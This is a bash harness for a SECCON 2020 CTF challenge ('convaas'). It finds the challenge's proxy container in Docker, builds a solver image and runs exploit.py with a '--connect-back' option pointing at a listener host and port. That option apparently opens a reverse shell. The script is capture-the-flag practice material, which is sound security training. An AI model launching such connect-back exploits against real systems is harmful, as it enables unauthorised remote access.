#/bin/bash

set -e -x

container_name=$(docker container ls --filter=name=proxy --format='{{.Names}}')
internal_network=$(docker container inspect --format='{{range $k, $v := .NetworkSettings.Networks}}{{if (eq (index (split $k "_") 1) "internal")}}{{$k}}{{end}}{{end}}' "${container_name}")
default_network=$(docker container inspect --format='{{range $k, $v := .NetworkSettings.Networks}}{{if (eq (index (split $k "_") 1) "default")}}{{$k}}{{end}}{{end}}' "${container_name}")

if [ -z $2 ]
then
    lhost=$(docker container inspect --format='{{.NetworkSettings.Networks.'"${default_network}"'.Gateway}}' "${container_name}")
else
    lhost=$2
fi
lport=$1

seccon_host=$(docker container inspect --format='{{.NetworkSettings.Networks.'"${default_network}"'.IPAddress}}' "${container_name}")
seccon_port=$((0xd0c0))

docker build -t seccon-2020-online-ctf-convaas-solver .
docker run --rm --network="${default_network}" -e SECCON_HOST="${seccon_host}" -e SECCON_PORT="${seccon_port}" seccon-2020-online-ctf-convaas-solver python exploit.py --connect-back "${lhost}":"${lport}"
